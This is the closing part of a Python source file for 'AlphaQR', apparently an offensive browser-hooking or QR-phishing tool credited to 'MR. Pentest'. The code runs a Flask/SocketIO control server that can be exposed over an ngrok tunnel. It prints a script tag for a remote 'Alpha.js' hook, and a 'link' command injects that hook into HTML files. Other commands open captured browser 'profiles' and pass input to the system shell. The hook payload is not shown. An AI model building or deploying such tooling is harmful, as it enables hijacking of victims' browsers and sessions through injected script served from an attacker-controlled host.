    # Print each banner line with consistent padding
    for line in colored_banner_lines:
        print(f"{' ' * center_padding}{line}")
        
    print()
    
    # Subtitle lines with proper centering and coloring
    # Replace dots with a solid line in cyan color - make sure it's the same width as the banner
    subtitle2 = "{CYAN}" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" 
    subtitle3 = "{GREEN}Version: 2.0     {GREEN}Linkedin: www.linkedin.com/in/varun--775a77310     {GREEN}By: MR. Pentest"
    
    subtitles = [subtitle2, subtitle3]
    colored_subtitles = [parse_color_tags(subtitle) for subtitle in subtitles]
    
    clean_subtitles = [re.sub(r'\x1b\[[0-9;]*m', '', subtitle) for subtitle in colored_subtitles]
    max_subtitle_len = max(len(subtitle) for subtitle in clean_subtitles)
    
    if max_subtitle_len > banner_width:
        center_padding = max(0, (terminal_width - max_subtitle_len) // 2)
        
    for i, subtitle in enumerate(colored_subtitles):
        clean_subtitle = re.sub(r'\x1b\[[0-9;]*m', '', subtitle)
        if i == 0 or i == 2:  # Title or version info
            extra_pad = max(0, (max_subtitle_len - len(clean_subtitle)) // 2)
            print(f"{' ' * (center_padding + extra_pad)}{subtitle}")
        else:  # Center line
            print(f"{' ' * center_padding}{subtitle}")
            
    print("\n")
    
    # Display URLs
    server_mode = "Ngrok" if "ngrok" in url else "Local"
    
    # Calculate padding for URL lines to be somewhat centered but left-aligned relative to each other
    # Using banner_width as a rough guide for where to start
    url_padding = center_padding
    
    if server_mode == "Local":
        control_panel = f"{url}/AlphaQR"
        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
        print(f"{' ' * url_padding}{Fore.YELLOW}Control Panel : {Fore.CYAN}{control_panel}")
        
        js_tag = f'<script src="{url}/Alpha.js"></script>'
        print(f"{' ' * url_padding}{Fore.YELLOW}JavaScript Tag: {Fore.CYAN}{js_tag}")
        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
    else:
        # Assuming url is the full ngrok url like https://xxxx.ngrok-free.app
        control_panel = f"{url}/AlphaQR"
        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")
        
        print(f"{' ' * url_padding}{Fore.YELLOW}Control Panel : {Fore.MAGENTA}{control_panel}")
        
        js_tag = f'<script src="{url}/Alpha.js"></script>'
        print(f"{' ' * url_padding}{Fore.YELLOW}JavaScript Tag: {Fore.MAGENTA}{js_tag}")
        print(f"{' ' * url_padding}{Fore.WHITE}════════════════════════════════════════════════════════════════════════════════════")

    print("\n")

def run_server_thread():
    # Disable flask banner
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    
    # Run SocketIO server
    try:
        socketio.run(app, host='0.0.0.0', port=5000, debug=False, use_reloader=False, log_output=False)
    except Exception as e:
        print(f"Server Error: {e}")

def link_command(filename):
    """Hooks the specified HTML file with Alpha.js"""
    try:
        if not os.path.exists(filename):
            print(f"{Fore.RED}File not found: {filename}{Style.RESET_ALL}")
            return
            
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
            
        script_tag = f'<script src="{CURRENT_URL}/Alpha.js"></script>'
        
        # Check if already hooked with ANY Alpha.js
        pattern = r'<script\s+[^>]*src=["\'][^"\']*/Alpha\.js["\'][^>]*>\s*</script>'
        
        if re.search(pattern, content):
            # Update existing hook
            new_content = re.sub(pattern, script_tag, content)
            print(f"{Fore.GREEN}Updating existing hook in {filename}...{Style.RESET_ALL}")
        else:
            # Inject new hook before </body> or </head>
            if "</body>" in content:
                new_content = content.replace("</body>", f"{script_tag}\n</body>")
            elif "</head>" in content:
                new_content = content.replace("</head>", f"{script_tag}\n</head>")
            else:
                new_content = content + "\n" + script_tag
            print(f"{Fore.GREEN}Injecting hook into {filename}...{Style.RESET_ALL}")
            
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(new_content)
            
        print(f"{Fore.GREEN}✓ Successfully hooked {filename}{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.RED}Error linking file: {e}{Style.RESET_ALL}")

def start_ngrok_tunnel():
    """Starts ngrok tunnel and returns public URL"""
    try:
        # Try connecting without asking for token first
        print(f"{Fore.YELLOW}Attempting to start Ngrok tunnel...{Style.RESET_ALL}")
        public_url = ngrok.connect(5000).public_url
        return public_url
    except Exception as e:
        # If it fails, then ask for token
        print(f"{Fore.RED}Ngrok auto-connect failed: {e}{Style.RESET_ALL}")
        token = input(f"{Fore.YELLOW}Enter Ngrok Authtoken (or press Enter to skip): {Style.RESET_ALL}").strip()
        if token:
            conf.get_default().auth_token = token
            try:
                public_url = ngrok.connect(5000).public_url
                return public_url
            except Exception as e2:
                print(f"{Fore.RED}Ngrok Error: {e2}{Style.RESET_ALL}")
        return None

def main():
    global CURRENT_URL
    
    # 1. Host Selection
    print(f"{Fore.CYAN}Select Hosting Option:{Style.RESET_ALL}")
    print("1. Localhost (127.0.0.1:5000)")
    print("2. Ngrok (Public URL)")
    
    choice = input(f"{Fore.GREEN}Enter choice (1-2): {Style.RESET_ALL}").strip()
    
    if choice == '2':
        url = start_ngrok_tunnel()
        if url:
            CURRENT_URL = url
        else:
            print(f"{Fore.RED}Falling back to Localhost...{Style.RESET_ALL}")
    
    # 2. Start Server
    t = threading.Thread(target=run_server_thread, daemon=True)
    t.start()
    
    # Give server a moment to start
    time.sleep(1)
    
    # 3. Banner
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner(CURRENT_URL)
    
    # 4. Command Loop
    while True:
        try:
            cmd_input = input(f"{Fore.GREEN}AlphaQR$ {Style.RESET_ALL}").strip()
            parts = cmd_input.split()
            if not parts: continue
            
            cmd = parts[0].lower()
            
            if cmd == "exit":
                print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
                os._exit(0)
                
            elif cmd == "help":
                print(f"""
{Fore.CYAN}Available Commands:{Style.RESET_ALL}
  link <file.html>  - Hook Alpha.js to HTML file
  server            - Open Designer in Browser
  open <number>     - Open dynamic profile folder in headed/visible browser
  restart           - Restart the application
  exit              - Exit AlphaQR
                """)
                
            elif cmd == "server":
                webbrowser.open(f"{CURRENT_URL}/AlphaQR")
                print(f"{Fore.GREEN}Opened in browser.{Style.RESET_ALL}")
                
            elif cmd == "restart":
                print(f"{Fore.YELLOW}Restarting...{Style.RESET_ALL}")
                os.execv(sys.executable, ['python'] + sys.argv)
                
            elif cmd == "open":
                if len(parts) < 2:
                    print(f"{Fore.RED}Usage: open <profile_number>{Style.RESET_ALL}")
                else:
                    profile_str = parts[1]
                    if profile_str.isdigit():
                        open_profile_visible(int(profile_str))
                    else:
                        print(f"{Fore.RED}Profile number must be an integer.{Style.RESET_ALL}")
                        
            elif cmd == "link":
                if len(parts) < 2:
                    print(f"{Fore.RED}Usage: link <filename>{Style.RESET_ALL}")
                else:
                    link_command(parts[1])
            
            else:
                # Forward to system shell
                try:
                    if platform.system() == "Windows":
                        # Run command in powershell to support both cmd & powershell commands perfectly
                        escaped_cmd = cmd_input.replace('"', '`"')
                        os.system(f'powershell -Command "{escaped_cmd}"')
                    else:
                        # Linux/macOS
                        os.system(cmd_input)
                except Exception as shell_err:
                    print(f"{Fore.RED}Failed to execute system command: {shell_err}{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Exiting...{Style.RESET_ALL}")
            os._exit(0)
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
